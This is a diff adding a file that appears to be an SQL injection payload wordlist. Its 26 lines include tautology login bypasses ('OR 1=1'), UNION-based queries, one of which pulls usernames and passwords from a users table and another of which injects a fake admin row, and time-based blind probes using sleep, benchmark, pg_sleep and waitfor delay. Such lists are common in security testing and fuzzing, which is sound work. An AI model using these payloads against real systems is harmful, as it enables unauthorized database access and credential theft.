@@ -1,0 +1,26 @@
+'
+' OR 1=1 --
+' OR '1'='1
+' OR '1'='1' --
+" OR 1=1 --
+" OR "1"="1
+" OR "1"="1" --
+') OR ('1'='1
+') OR ('1'='1' --
+1' OR '1' = '1
+1' OR '1' = '1' --
+' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,3,4 --
+' UNION SELECT null,null,null --
+" UNION SELECT null,null,null --
+' OR '1'='1' LIMIT 1 --
+' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' --
+' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users --
+" OR sleep(5) --
+' OR sleep(5) --
+" OR benchmark(10000000,MD5(1)) --
+' OR benchmark(10000000,MD5(1)) --
+" OR pg_sleep(5) --
+' OR pg_sleep(5) --
+"; waitfor delay '0:0:5' --
+'; waitfor delay '0:0:5' --
